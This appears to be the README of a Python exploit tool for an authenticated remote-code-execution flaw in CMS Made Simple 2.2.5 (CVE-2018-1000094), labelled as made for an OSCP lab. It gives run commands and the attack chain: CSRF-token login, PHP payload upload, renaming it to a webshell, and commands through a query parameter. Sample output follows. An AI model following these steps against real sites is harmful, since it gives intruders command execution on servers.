# CMS Made Simple 2.2.5 Auth RCE

**CVE-2018-1000094** | Python 3 | Authenticated File Upload → Webshell

> made for OSCP lab

## Usage

**Edit variables at top:**
```python
base_url = "https://target/admin"
username = "admin" 
password = "password"
```

**run exploit**
```bash
python3 cms-made-simple-2.2.5-auth-rce.py
```

## How it works

1. **Login** → Extract `_sk_` CSRF token from redirect
2. **Upload** `cmsmsrce.txt` (PHP payload) to `/uploads`
3. **Copy/Rename** → `shell.php` in webroot via serialized exploit
4. **Shell**: `https://target/uploads/shell.php?cmd=id`

## Output

```
[+] Auth OK, CSRF: 4ea85939cbf7b369d89
[*] Upload: 200
[*] Copy: 302 → copysuccess
[+] SUCCESS! Shell: https://target/uploads/shell.php?cmd=id
```
